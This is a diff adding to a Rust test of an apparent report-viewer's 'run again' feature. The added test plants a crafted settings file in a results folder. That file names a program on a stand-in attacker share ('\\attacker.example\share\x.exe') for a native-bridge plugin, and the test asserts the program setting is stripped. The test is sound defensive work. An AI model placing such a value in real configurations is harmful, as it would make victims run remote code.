@@ -290,4 +290,14 @@ fn reports_from_the_command_line_open_too() {
     assert_eq!(session.recent()[0].output_dir, folder.display().to_string(), "it joins the recent list");
     assert!(session.open_report_at(&folder.join("report.json")).is_ok(), "the file itself works too");
     assert!(session.open_report_at(&classes).is_err(), "a folder without a report is refused");
+
+    // Someone sends a results folder whose settings name a program for the native bridge:
+    // Run again keeps the plugin but not the program.
+    let crafted = "plugins:\n  native-bridge:\n    python: '\\\\attacker.example\\share\\x.exe'\nlimits:\n  maxSleeps: 3\n";
+    std::fs::write(folder.join("config.yaml"), crafted).unwrap();
+    session.open_report_at(&folder).unwrap();
+    session.run_again().unwrap();
+    let settings = session.settings_text().unwrap();
+    assert!(!settings.contains("python") && !settings.contains("attacker"), "{settings}");
+    assert!(settings.contains("native-bridge") && settings.contains("maxSleeps: 3"), "{settings}");
 }
